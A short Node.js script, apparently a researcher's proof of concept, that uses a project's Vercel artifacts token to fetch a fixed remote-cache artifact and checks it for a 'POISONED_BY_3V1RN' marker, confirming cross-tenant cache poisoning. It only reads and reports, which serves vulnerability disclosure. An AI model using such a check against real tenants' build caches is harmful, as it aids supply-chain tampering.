const { VERCEL_ARTIFACTS_TOKEN, VERCEL_ARTIFACTS_ID } = process.env;

async function checkPoison() {
    console.log("[?] Checking for remote cache artifacts...");
    
    const artifactHash = "deadbeef1337"; 
    const url = `https://api.vercel.com/v8/artifacts/${artifactHash}`;

    try {
        const res = await fetch(url, {
            headers: {
                'Authorization': `Bearer ${VERCEL_ARTIFACTS_TOKEN}`
            }
        });

        if (res.status === 200) {
            const content = await res.text();
            console.log(`[!] ARTIFACT FOUND! Content: "${content}"`);
            
            if (content.includes("POISONED_BY_3V1RN")) {
                console.log("\n[🚨][🚨][🚨] CONFIRMED: THIS PROJECT IS USING POISONED CACHE FROM ANOTHER TENANT!");
            }
        } else {
            console.log(`[-] Artifact not found or status: ${res.status}`);
        }
    } catch (e) {
        console.log(`[!] Error: ${e.message}`);
    }
}

checkPoison();
